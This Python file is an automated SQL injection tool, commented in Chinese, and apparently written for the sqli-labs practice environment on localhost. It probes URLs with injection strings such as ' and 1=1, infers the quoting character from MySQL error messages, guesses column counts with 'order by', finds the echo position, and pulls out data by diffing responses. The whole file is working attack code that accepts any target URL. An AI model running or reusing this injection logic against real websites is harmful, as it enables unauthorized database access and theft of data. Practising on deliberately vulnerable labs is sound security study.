import requests
from code1.exploit import exploit
import re
from re import search

class information:


    def built_url(url):
        #判断是否是数字型的
        str1='\' and 1=1'
        url1=url+str1
        response  = requests.get(url)
        str2=str(response.content.decode("gbk"))
        response  = requests.get(url1)
        str3=str(response.content.decode("gbk"))
        built_url=''
        if search(str1,str3):
            print('该网址存在数字型注入')
            built_url=url
        else:
            if str2!=str3:
                print('该网址可能存在字符型注入...')
                get_in_str=information.get_in_str(url,url1)

                built_url=url+str(get_in_str)
            else:
                str1="\"%20and%201=1"
                url1=url+str1
                response  = requests.get(url1)
                str4=str(response.content.decode("utf-8"))
                if str2==str4:
                    print('注入失败！')
                else:
                    print('该网址可能存在字符型注入...')

                    get_in_str=information.get_in_str(url,url1)
                    built_url=url+str(get_in_str)
        if built_url=='':
            print("注入失败")
        return built_url


    #获取注入符号
        #参数：用户输入url，自己判断注入点采用的url
        #返回值：url后要拼接的符号
    def get_in_str(url,url1):
        #获取网页信息
        #str1:原网页，str2：目的网页
        response  = requests.get(url)
        str1=str(response.content.decode("gbk")).split()
        response  = requests.get(url1)
        str2=str(response.content.decode("gbk")).split()
        str3=[]

        #保存相同的，去掉，剩下不同的
        for i in  str1:
            if i in str2:
                str3.append(i)
        for i in str3:
            if i in str2:
                str2.remove(i)
        str3=''
        for i in range (len(str2)):
            str3+=str2[i]
            if i <len(str2)-1:
                str3+=' '
        a,b=re.search("near '",str3).span()
        a,c=re.search("' at ",str3).span()

        str4=str3[b:a]
        in_str=str4[0:2]
        return in_str



    #根据初始url得到字段数
        #参数：初始的url，url=url+'%20and%201%20=%201'以及url+="'%20and%201%20=%201"
        #返回值：字段数
    def get_counts(url,url2):

        response  = requests.get(url)
        str1=str(response.content.decode("gbk"))
        for i in range(1,100):
            url1=url2+'%20order%20by%20'+str(i)+' --+'

            response  = requests.get(url1)
            str2=str(response.content.decode("gbk"))
            #字段数小于一说明有问题
            if i==1:
                if str1==str2:
                    print('可以使用 order by 猜解')
                else:
                    print('不能使用order by 猜解')
                    break
            else:
                if str2!=str1:
                    print('字段数',i-1)
                    break
        if i==99:
            print('未能猜解字段数')

        return i-1

    #获得回显位置
            # 参数：初始的url，url=url+'%20and%201%20=%201'以及判断回显位置构造的语句
            #返回值：int型的position
    def get_position(url,exploit_string):
        response  = requests.get(url)
        str1=str(response.content.decode("gbk")).split()
        response  = requests.get(exploit_string)
        str2=str(response.content.decode("gbk")).split()
        str3=[]
        for i in  str1:
            if i in str2:
                str3.append(i)
        for i in str3:
            if i in str1:
                str1.remove(i)
        for i in str3:
            if i in str2:
                str2.remove(i)
        if len(str1)==0 or len(str2)==0:
            print('判断回显位置失败')
            return 0
        else:
            str1=str1[0]
            str2=str2[0]
            for i in range (len(str2)):
                if str2[i] != str1[i]:
                    start=i
                    break
            position=int(str2[start])

            print('回显位置为'+str(position))
            return position

    #获取信息
    #参数：两个不同的url，第一个，判断位置时用到的url，第二个，需要获取相应数据的url
    def get_infor(url,url1):
        #获取网页信息
        #str1:原网页，str2：目的网页
        response  = requests.get(url)
        str1=str(response.content.decode("gbk")).split()
        response  = requests.get(url1)
        str2=str(response.content.decode("gbk")).split()
        str3=[]

        #保存相同的，去掉，剩下不同的
        for i in  str1:
            if i in str2:
                str3.append(i)
        for i in str3:
            if i in str1:
                str1.remove(i)
        for i in str3:
            if i in str2:
                str2.remove(i)

        str3=str1[0]
        str4=str2[0]

        #比较位置
        for i in range (len(str4)):
            if str3[i] != str4[i]:
                start=i
                break
        a=''
        for i in str3:
            a=i+a
        b=''
        for i in str4:
            b=i+b
        for i in range (len(b)):
            if a[i] != b[i]:
                start_end=i
                break

        string=str4[start:len(str4)-start_end]
        print(string)
        return string





    def get_data(url,url1):
        #获取网页信息
        #str1:原网页，str2：目的网页
        response  = requests.get(url)
        str1=str(response.content.decode("gbk")).split()
        response  = requests.get(url1)
        str2=str(response.content.decode("gbk")).split()
        str3=[]

        #保存相同的，去掉，剩下不同的
        for i in  str1:
            if i in str2:
                str3.append(i)
        for i in str3:
            if i in str1:
                str1.remove(i)
        for i in str3:
            if i in str2:
                str2.remove(i)
        str5=''
        for i in range(len(str2)):
            str5+=str2[i]
            if i <len(str2)-1:
                str5+=' '
        str3=str1[0]
        str4=str5

        #比较位置
        for i in range (len(str4)):
            if str3[i] != str4[i]:
                start=i
                break
        a=''
        for i in str3:
            a=i+a
        b=''
        for i in str4:
            b=i+b
        for i in range (len(b)):
            if a[i] != b[i]:
                start_end=i
                break

        string=str4[start:len(str4)-start_end]
        print(string)
        return string

if __name__ == '__main__':

    url="http://localhost/sqli-labs-master/Less-3/?id=1"

    b=information.built_url(url)
    print(b)










